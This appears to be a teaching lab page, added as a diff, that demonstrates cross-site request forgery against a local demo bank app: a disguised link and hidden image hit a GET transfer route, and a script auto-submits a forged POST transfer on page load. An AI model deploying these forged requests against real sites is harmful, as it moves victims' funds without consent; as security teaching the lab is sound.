@@ -1,0 +1,55 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Malicious Web Page</title>
+</head>
+<body>
+<!-- GET request exploit -->
+  <h2>Demo: Exploiting the GET route</h2>
+  <p>
+		The <code>GET /transfer</code> route is the most easily exploited. It's as simple as tricking the target user into opening a webpage with a malicious <code>&lt;img&gt;</code> tag:
+	</p>
+  <div>
+		<!-- <img src="http://localhost:3000/transfer?to=alice&amount=15" width="1px" height="1px"> -->
+	</div>
+  <br>
+  <p>
+		Or by tricking the target user into clicking a malicious link:
+		<a href="http://localhost:3000/transfer?to=alice&amount=25">Click here to upgrade!!!</a> 
+	</p>
+  <div>
+
+	</div>
+  
+<!-- POST Request exploit. Refer to last lecture's notes!!
+	comment out the above GET request for your lab and add code below 
+-->
+  <h2>Your turn! Exploiting the POST route</h2>
+  <p>The <code>POST /transfer</code> route requires using JavaScript to submit an HTML form:</p>
+  
+	 <script type="text/javaScript">
+	function forge_post (){
+		var fields = "";
+
+		fields += "<input type ='hidden' name='to' value='alice'>";
+		fields += "<input type ='hidden' name='amount' value='10'>";
+
+		var p = document.createElement("form");
+		p.action = "http://localhost:3000/transfer";
+		p.innerHTML = fields;
+		p.method = "post";
+		document.body.appendChild(p);
+		p.submit();
+
+	}
+
+	window.onload = function() { forge_post ();}
+		
+	</script>
+
+</body>
+</html>
